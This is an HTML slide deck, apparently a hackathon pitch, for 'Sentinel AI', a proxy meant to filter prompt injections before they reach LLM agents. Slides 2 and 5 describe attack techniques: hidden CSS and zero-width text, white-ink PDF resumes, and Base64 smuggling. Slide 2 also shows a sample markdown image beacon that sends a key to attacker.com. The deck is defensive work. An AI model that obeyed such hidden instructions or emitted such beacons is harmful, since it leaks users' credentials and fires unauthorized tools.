@@ -1,0 +1,616 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Sentinel AI — Vihaan X (IEEE DTU) Pitch Deck</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      background: #060913;
+      color: #e2e8f0;
+      font-family: 'Plus Jakarta Sans', -apple-system, BlinkMacSystemFont, sans-serif;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 24px;
+      overflow-x: hidden;
+    }
+
+    /* Presentation Frame (16:9 Aspect Ratio) */
+    .deck-container {
+      width: 100%;
+      max-width: 1150px;
+      aspect-ratio: 16 / 9;
+      background: radial-gradient(circle at 10% 10%, #0f172a 0%, #080d1a 100%);
+      border: 1px solid #1e293b;
+      border-radius: 20px;
+      box-shadow: 0 25px 60px -15px rgba(0, 0, 0, 0.7), 0 0 50px rgba(16, 185, 129, 0.08);
+      position: relative;
+      overflow: hidden;
+      display: flex;
+      flex-direction: column;
+    }
+
+    /* Slides container */
+    .slide {
+      display: none;
+      flex-direction: column;
+      width: 100%;
+      height: 100%;
+      padding: 48px 56px;
+      position: relative;
+    }
+    .slide.active {
+      display: flex;
+      animation: fadeIn 0.3s ease-out forwards;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(6px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    /* Header styling */
+    .slide-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 24px;
+      padding-bottom: 14px;
+      border-bottom: 1px solid #1e293b;
+    }
+    .badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 11px;
+      font-weight: 600;
+      padding: 4px 12px;
+      border-radius: 9999px;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+    .badge-emerald { background: rgba(16, 185, 129, 0.12); color: #34d399; border: 1px solid rgba(16, 185, 129, 0.3); }
+    .badge-cyan { background: rgba(6, 182, 212, 0.12); color: #22d3ee; border: 1px solid rgba(6, 182, 212, 0.3); }
+    .badge-rose { background: rgba(244, 63, 94, 0.12); color: #fb7185; border: 1px solid rgba(244, 63, 94, 0.3); }
+
+    .slide-number {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 13px;
+      color: #64748b;
+      font-weight: 500;
+    }
+
+    h1.slide-title {
+      font-size: 32px;
+      font-weight: 800;
+      color: #ffffff;
+      letter-spacing: -0.5px;
+      margin-bottom: 6px;
+    }
+    p.slide-subtitle {
+      font-size: 15px;
+      color: #94a3b8;
+      margin-bottom: 24px;
+      line-height: 1.5;
+    }
+
+    /* Grid Layouts */
+    .grid-2 {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 20px;
+      flex: 1;
+    }
+    .grid-3 {
+      display: grid;
+      grid-template-columns: 1fr 1fr 1fr;
+      gap: 18px;
+      flex: 1;
+    }
+    .grid-4 {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      grid-template-rows: 1fr 1fr;
+      gap: 16px;
+      flex: 1;
+    }
+
+    /* Card styling */
+    .card {
+      background: rgba(15, 23, 42, 0.6);
+      border: 1px solid #1e293b;
+      border-radius: 14px;
+      padding: 20px 22px;
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+      position: relative;
+      transition: border-color 0.2s;
+    }
+    .card:hover {
+      border-color: #334155;
+    }
+    .card-accent-emerald { border-left: 3px solid #10b981; }
+    .card-accent-cyan { border-left: 3px solid #06b6d4; }
+    .card-accent-rose { border-left: 3px solid #f43f5e; }
+    .card-accent-amber { border-left: 3px solid #f59e0b; }
+    .card-accent-purple { border-left: 3px solid #a855f7; }
+
+    .card-title {
+      font-size: 16px;
+      font-weight: 700;
+      color: #f8fafc;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    .card-desc {
+      font-size: 13px;
+      color: #94a3b8;
+      line-height: 1.55;
+    }
+    ul.bullet-list {
+      list-style: none;
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+      margin-top: 4px;
+    }
+    ul.bullet-list li {
+      font-size: 12.5px;
+      color: #cbd5e1;
+      line-height: 1.5;
+      padding-left: 18px;
+      position: relative;
+    }
+    ul.bullet-list li::before {
+      content: "•";
+      position: absolute;
+      left: 4px;
+      color: #38bdf8;
+      font-weight: bold;
+    }
+
+    /* Metric highlight pill */
+    .metric-badge {
+      display: inline-block;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 11px;
+      background: #022c22;
+      color: #34d399;
+      border: 1px solid #059669;
+      border-radius: 6px;
+      padding: 3px 8px;
+      margin-top: auto;
+      font-weight: 600;
+      width: fit-content;
+    }
+
+    /* Title Slide Specifics */
+    .title-slide {
+      justify-content: center;
+      align-items: center;
+      text-align: center;
+      padding: 40px;
+    }
+    .hackathon-pill {
+      background: linear-gradient(90deg, rgba(16, 185, 129, 0.15), rgba(6, 182, 212, 0.15));
+      border: 1px solid rgba(16, 185, 129, 0.35);
+      color: #6ee7b7;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 12px;
+      font-weight: 600;
+      padding: 6px 18px;
+      border-radius: 9999px;
+      letter-spacing: 1px;
+      margin-bottom: 20px;
+      text-transform: uppercase;
+    }
+    .hero-title {
+      font-size: 56px;
+      font-weight: 800;
+      letter-spacing: -1.5px;
+      background: linear-gradient(135deg, #ffffff 40%, #94a3b8 100%);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      margin-bottom: 12px;
+    }
+    .hero-subtitle {
+      font-size: 20px;
+      color: #38bdf8;
+      font-weight: 500;
+      max-width: 780px;
+      margin-bottom: 28px;
+      line-height: 1.4;
+    }
+    .team-box {
+      background: rgba(15, 23, 42, 0.8);
+      border: 1px solid #1e293b;
+      border-radius: 14px;
+      padding: 16px 32px;
+      display: flex;
+      align-items: center;
+      gap: 32px;
+      font-size: 13px;
+    }
+    .team-box-item {
+      display: flex;
+      flex-direction: column;
+      gap: 2px;
+      text-align: left;
+    }
+    .team-box-label {
+      font-size: 10px;
+      font-family: 'JetBrains Mono', monospace;
+      color: #64748b;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+    .team-box-val {
+      color: #f1f5f9;
+      font-weight: 700;
+      font-size: 14px;
+    }
+
+    /* Controls bar at bottom */
+    .controls {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      width: 100%;
+      max-width: 1150px;
+      margin-top: 18px;
+      padding: 0 8px;
+    }
+    .nav-buttons {
+      display: flex;
+      gap: 10px;
+    }
+    button.btn {
+      background: #1e293b;
+      color: #f1f5f9;
+      border: 1px solid #334155;
+      border-radius: 8px;
+      padding: 9px 18px;
+      font-size: 13px;
+      font-weight: 600;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      transition: all 0.15s;
+    }
+    button.btn:hover {
+      background: #334155;
+      border-color: #475569;
+    }
+    button.btn-primary {
+      background: #059669;
+      border-color: #10b981;
+      color: #ffffff;
+    }
+    button.btn-primary:hover {
+      background: #10b981;
+    }
+    .keyboard-hint {
+      font-size: 12px;
+      font-family: 'JetBrains Mono', monospace;
+      color: #64748b;
+    }
+
+    /* Print styling for PDF export */
+    @media print {
+      body { background: #000; padding: 0; }
+      .controls { display: none !important; }
+      .deck-container {
+        border: none;
+        box-shadow: none;
+        width: 100%;
+        max-width: 100%;
+        aspect-ratio: auto;
+      }
+      .slide {
+        display: flex !important;
+        page-break-after: always;
+        height: 100vh;
+        border-bottom: 1px solid #333;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Slide Deck Container -->
+  <div class="deck-container" id="deck">
+
+    <!-- SLIDE 1: Title Slide -->
+    <div class="slide title-slide active" data-slide="1">
+      <div class="hackathon-pill">Vihaan X • Organized by IEEE Student Branch DTU</div>
+      <div class="hero-title">SENTINEL AI</div>
+      <div class="hero-subtitle">Drop-In Multi-Modal AI Security Firewall, Taint Tracker & Interactive X-Ray Sandbox</div>
+      <div class="team-box">
+        <div class="team-box-item">
+          <div class="team-box-label">Team Name</div>
+          <div class="team-box-val" style="color:#10b981">LEARNERS</div>
+        </div>
+        <div class="team-box-item" style="border-left: 1px solid #334155; padding-left: 24px;">
+          <div class="team-box-label">Team Members</div>
+          <div class="team-box-val">Priyanshu Kumar &nbsp;•&nbsp; Kishu Tiwari</div>
+        </div>
+        <div class="team-box-item" style="border-left: 1px solid #334155; padding-left: 24px;">
+          <div class="team-box-label">Project Domain</div>
+          <div class="team-box-val" style="color:#38bdf8">AI Safety & Cyber Defense</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- SLIDE 2: The Problem -->
+    <div class="slide" data-slide="2">
+      <div class="slide-header">
+        <div class="badge badge-rose">The Threat Landscape</div>
+        <div class="slide-number">02 / 06</div>
+      </div>
+      <h1 class="slide-title">The Multi-Modal Prompt Injection Crisis</h1>
+      <p class="slide-subtitle">Autonomous AI browser agents and RAG pipelines ingest untrusted external context without sanitization, leaving enterprises exposed to severe data exfiltration.</p>
+      
+      <div class="grid-2">
+        <div class="card card-accent-rose">
+          <div class="card-title">Invisible Attack Vectors</div>
+          <ul class="bullet-list">
+            <li><strong>Zero-Width Unicode:</strong> Malicious directives encoded into invisible Unicode character streams that bypass standard word filters.</li>
+            <li><strong>CSS Steganography:</strong> Micro-fonts (<code style="color:#f43f5e">font-size:0px</code>, <code style="color:#f43f5e">opacity:0</code>) and off-screen coordinates hidden from human eyes.</li>
+            <li><strong>PyMuPDF Trojan Resumes:</strong> Malicious 1.0pt white ink embedded into job applicant resumes to manipulate ATS recruiting bots.</li>
+            <li><strong>Encoded Smuggling:</strong> Base64 and HTML comments instructing agents to execute system commands.</li>
+          </ul>
+        </div>
+
+        <div class="card card-accent-amber">
+          <div class="card-title">Catastrophic Consequences</div>
+          <ul class="bullet-list">
+            <li><strong>Silent Markdown Exfiltration:</strong> The agent appends an image beacon like <code style="color:#f59e0b">![verify](attacker.com/sink?leak=KEY)</code> to leak private credentials via browser prefetching.</li>
+            <li><strong>Autonomous Tool Hijacking:</strong> Agent fires unauthorized functions: <code style="color:#f59e0b">send_offer_email(salary='$450k')</code> or forwarding financial records.</li>
+            <li><strong>The False-Positive Trap:</strong> Naive regex filters block legitimate developer specs containing keywords like <code style="color:#38bdf8">mTLS</code>, <code style="color:#38bdf8">AES-256</code>, and <code style="color:#38bdf8">token</code>.</li>
+          </ul>
+        </div>
+      </div>
+    </div>
+
+    <!-- SLIDE 3: Architecture & 3-Layer Defense -->
+    <div class="slide" data-slide="3">
+      <div class="slide-header">
+        <div class="badge badge-emerald">Our Solution</div>
+        <div class="slide-number">03 / 06</div>
+      </div>
+      <h1 class="slide-title">3-Layer Defense-in-Depth Architecture</h1>
+      <p class="slide-subtitle">A transparent OpenAI-compatible proxy (<code style="color:#10b981">http://localhost:8000/v1</code>) that neutralizes indirect prompt injections in under 5 milliseconds.</p>
+
+      <div class="grid-3">
+        <div class="card card-accent-emerald">
+          <div class="card-title">Layer 1: Pre-Ingestion</div>
+          <div class="card-desc">Multi-modal content scrubber operating before tokens touch the LLM context window.</div>
+          <ul class="bullet-list">
+            <li><strong>HTML DOM Parser:</strong> AST-level stripping of zero-width Unicode and hidden CSS styles.</li>
+            <li><strong>PyMuPDF Vector Scanner:</strong> Analyzes font sizes & RGB contrast to purge white-on-white text.</li>
+            <li><strong>Obfuscation Decoder:</strong> Recursive Base64/Hex scanner.</li>
+          </ul>
+          <div class="metric-badge">Overhead: ~1.2 ms</div>
+        </div>
+
+        <div class="card card-accent-cyan">
+          <div class="card-title">Layer 2: Semantic Guard</div>
+          <div class="card-desc">Cryptographic prompt fencing and zero-shot threat scoring.</div>
+          <ul class="bullet-list">
+            <li><strong>Cryptographic Data-Marking:</strong> Wraps untrusted text in strict spotlighting nonces.</li>
+            <li><strong>Semantic Threat Scorer:</strong> Fast 0–100% heuristic evaluating instruction override vectors.</li>
+            <li><strong>Heal & Sanitize:</strong> Excises dangerous imperative spans while preserving benign context.</li>
+          </ul>
+          <div class="metric-badge">Overhead: ~0.6 ms</div>
+        </div>
+
+        <div class="card card-accent-purple">
+          <div class="card-title">Layer 3: Egress & Taint</div>
+          <div class="card-desc">Provenance tracking and autonomous tool call gatekeeper.</div>
+          <ul class="bullet-list">
+            <li><strong>Session Taint Engine:</strong> Tracks dirty inputs across multi-turn agent execution loops.</li>
+            <li><strong>Markdown Image Filter:</strong> Strips stealthy exfiltration image tags before output renders.</li>
+            <li><strong>Tool Call Gatekeeper:</strong> Quarantines sensitive functions for human verification.</li>
+          </ul>
+          <div class="metric-badge">Overhead: ~0.4 ms</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- SLIDE 4: Technical Highlights -->
+    <div class="slide" data-slide="4">
+      <div class="slide-header">
+        <div class="badge badge-cyan">Technical Superiority</div>
+        <div class="slide-number">04 / 06</div>
+      </div>
+      <h1 class="slide-title">Core Innovations & Performance Metrics</h1>
+      <p class="slide-subtitle">Engineered for low-latency enterprise environments where safety cannot come at the cost of speed or accuracy.</p>
+
+      <div class="grid-4">
+        <div class="card card-accent-emerald">
+          <div class="card-title">⚡ Sub-5ms Total Latency</div>
+          <div class="card-desc">Traditional LLM guardrails (like Llama-Guard) take 1,500ms+ per query. Sentinel AI uses deterministic AST sanitizers and compiled regex, adding only <strong>1.4ms to 3.8ms</strong> of overhead.</div>
+        </div>
+
+        <div class="card card-accent-cyan">
+          <div class="card-title">🔌 2-Line Drop-In Proxy</div>
+          <div class="card-desc">Compatible with standard OpenAI client libraries (<code style="color:#22d3ee">base_url="http://localhost:8000/v1"</code>). Protects LangChain, LlamaIndex, AutoGen, and CrewAI without modifying existing agent code.</div>
+        </div>
+
+        <div class="card card-accent-amber">
+          <div class="card-title">🎯 Zero False-Positive Benchmark</div>
+          <div class="card-desc">Proven against complex enterprise technical specs with terms like <em>mTLS, AES-256, KMS key</em>. Evaluates to <strong>0% threat score</strong> with 0 tokens censored, preserving full developer productivity.</div>
+        </div>
+
+        <div class="card card-accent-rose">
+          <div class="card-title">📡 Live Attacker Webhook Sink</div>
+          <div class="card-desc">Integrated real-time breach telemetry dashboard. Shows 1 Breach when unprotected; automatically neutralizes leaks to <strong>0 Breaches</strong> when Sentinel is active.</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- SLIDE 5: Proof of Defense -->
+    <div class="slide" data-slide="5">
+      <div class="slide-header">
+        <div class="badge badge-emerald">Interactive Exploit Lab</div>
+        <div class="slide-number">05 / 06</div>
+      </div>
+      <h1 class="slide-title">Demonstrating 4 Pre-Loaded Attack Scenarios</h1>
+      <p class="slide-subtitle">Real-world exploit simulations proving multi-modal protection across web, documents, emails, and enterprise benchmarks.</p>
+
+      <div class="grid-4">
+        <div class="card card-accent-rose">
+          <div class="card-title">1. Poisoned Webpage (SSD Review)</div>
+          <ul class="bullet-list">
+            <li><strong>Vector:</strong> CSS <code style="color:#f43f5e">font-size:0px</code> + Zero-Width Unicode.</li>
+            <li><strong>Without Sentinel:</strong> Bot exfiltrates live Stripe Secret Key to Attacker Sink.</li>
+            <li><strong>With Sentinel:</strong> Stripped at Layer 1; Sink stays at <strong>0 Breaches</strong>.</li>
+          </ul>
+        </div>
+
+        <div class="card card-accent-cyan">
+          <div class="card-title">2. Trojan PDF Resume (Alex Mercer)</div>
+          <ul class="bullet-list">
+            <li><strong>Vector:</strong> 1.0pt white ink embedded into PDF resume.</li>
+            <li><strong>Without Sentinel:</strong> Agent hijacked to invoke <code style="color:#06b6d4">send_offer_email(salary='$450k')</code>.</li>
+            <li><strong>With Sentinel:</strong> PyMuPDF purges invisible text; tool call quarantined.</li>
+          </ul>
+        </div>
+
+        <div class="card card-accent-amber">
+          <div class="card-title">3. Steganographic Phishing Email</div>
+          <ul class="bullet-list">
+            <li><strong>Vector:</strong> HTML comment + Base64 smuggled prompt injection.</li>
+            <li><strong>Without Sentinel:</strong> Forwards executive Q4 M&A password reset token.</li>
+            <li><strong>With Sentinel:</strong> Decoded and neutralized; confidential token protected.</li>
+          </ul>
+        </div>
+
+        <div class="card card-accent-emerald">
+          <div class="card-title">4. Benign Enterprise Doc (Control)</div>
+          <ul class="bullet-list">
+            <li><strong>Vector:</strong> High-security payment gateway architecture spec.</li>
+            <li><strong>Result:</strong> Evaluates to <strong>0% Threat Score</strong> and 0 fragments altered.</li>
+            <li><strong>Proof:</strong> Sub-2ms processing, zero false positives.</li>
+          </ul>
+        </div>
+      </div>
+    </div>
+
+    <!-- SLIDE 6: Viability & Conclusion -->
+    <div class="slide" data-slide="6">
+      <div class="slide-header">
+        <div class="badge badge-emerald">Conclusion & Next Steps</div>
+        <div class="slide-number">06 / 06</div>
+      </div>
+      <h1 class="slide-title">Production Roadmap & Future Impact</h1>
+      <p class="slide-subtitle">Positioning Sentinel AI as the essential security layer for autonomous enterprise agent fleets.</p>
+
+      <div class="grid-2">
+        <div class="card card-accent-cyan">
+          <div class="card-title">Future Engineering Roadmap</div>
+          <ul class="bullet-list">
+            <li><strong>Voice/Audio Stream Defense:</strong> Real-time acoustic prompt injection filtering for telephony and voice agents.</li>
+            <li><strong>Enterprise SIEM Integration:</strong> Native audit stream forwarding to Splunk, Datadog, and AWS CloudWatch.</li>
+            <li><strong>Hardware-Accelerated Enclaves:</strong> Confidential Computing (AMD SEV / Intel SGX) for zero-trust cryptographic nonces.</li>
+          </ul>
+        </div>
+
+        <div class="card card-accent-emerald">
+          <div class="card-title">Why Sentinel AI Wins at Vihaan X</div>
+          <ul class="bullet-list">
+            <li><strong>Completely Drop-In:</strong> 2 lines of code; zero model retraining or vendor lock-in.</li>
+            <li><strong>High-Speed Security:</strong> Sub-5ms overhead vs. 1500ms LLM guardrails.</li>
+            <li><strong>Full Multi-Modal Stack:</strong> Covers Web HTML, PDF Resumes, Base64 & Tool Egress.</li>
+            <li><strong>Working Prototype:</strong> 100% functional live testbed with real-time X-Ray diff viewer.</li>
+          </ul>
+        </div>
+      </div>
+
+      <div style="margin-top: 18px; padding: 14px 20px; background: rgba(16, 185, 129, 0.08); border: 1px solid rgba(16, 185, 129, 0.3); border-radius: 12px; display: flex; justify-content: space-between; align-items: center;">
+        <div>
+          <span style="font-weight: 700; color: #10b981; font-size: 14px;">Sentinel AI</span> — Securing Autonomous AI, One Token at a Time.
+          <div style="font-size: 12px; color: #94a3b8; margin-top: 2px;">Team Learners: Priyanshu Kumar & Kishu Tiwari • Vihaan X (IEEE DTU)</div>
+        </div>
+        <div style="font-family: 'JetBrains Mono', monospace; font-size: 12px; color: #38bdf8;">
+          Live Sandbox: http://localhost:5173
+        </div>
+      </div>
+    </div>
+
+  </div>
+
+  <!-- Bottom Presentation Controls -->
+  <div class="controls">
+    <div class="nav-buttons">
+      <button class="btn" onclick="prevSlide()">← Previous</button>
+      <button class="btn btn-primary" onclick="nextSlide()">Next Slide →</button>
+      <button class="btn" onclick="toggleFullScreen()">⛶ Fullscreen</button>
+      <button class="btn" onclick="window.print()">🖨️ Export PDF (Ctrl+P)</button>
+    </div>
+    <div class="keyboard-hint">
+      Use <kbd style="background:#1e293b; padding:2px 6px; border-radius:4px; border:1px solid #334155;">←</kbd> <kbd style="background:#1e293b; padding:2px 6px; border-radius:4px; border:1px solid #334155;">→</kbd> or <kbd style="background:#1e293b; padding:2px 6px; border-radius:4px; border:1px solid #334155;">Space</kbd> to navigate
+    </div>
+  </div>
+
+  <script>
+    let currentSlide = 1;
+    const totalSlides = 6;
+
+    function showSlide(n) {
+      const slides = document.querySelectorAll('.slide');
+      if (n > totalSlides) currentSlide = 1;
+      if (n < 1) currentSlide = totalSlides;
+      
+      slides.forEach((slide) => {
+        slide.classList.remove('active');
+        if (parseInt(slide.getAttribute('data-slide')) === currentSlide) {
+          slide.classList.add('active');
+        }
+      });
+    }
+
+    function nextSlide() {
+      currentSlide++;
+      if (currentSlide > totalSlides) currentSlide = 1;
+      showSlide(currentSlide);
+    }
+
+    function prevSlide() {
+      currentSlide--;
+      if (currentSlide < 1) currentSlide = totalSlides;
+      showSlide(currentSlide);
+    }
+
+    function toggleFullScreen() {
+      const deck = document.getElementById('deck');
+      if (!document.fullscreenElement) {
+        deck.requestFullscreen().catch(err => alert(`Error: ${err.message}`));
+      } else {
+        document.exitFullscreen();
+      }
+    }
+
+    document.addEventListener('keydown', (e) => {
+      if (e.key === 'ArrowRight' || e.key === ' ' || e.key === 'PageDown') {
+        nextSlide();
+      } else if (e.key === 'ArrowLeft' || e.key === 'PageUp') {
+        prevSlide();
+      } else if (e.key === 'f' || e.key === 'F') {
+        toggleFullScreen();
+      }
+    });
+  </script>
+</body>
+</html>
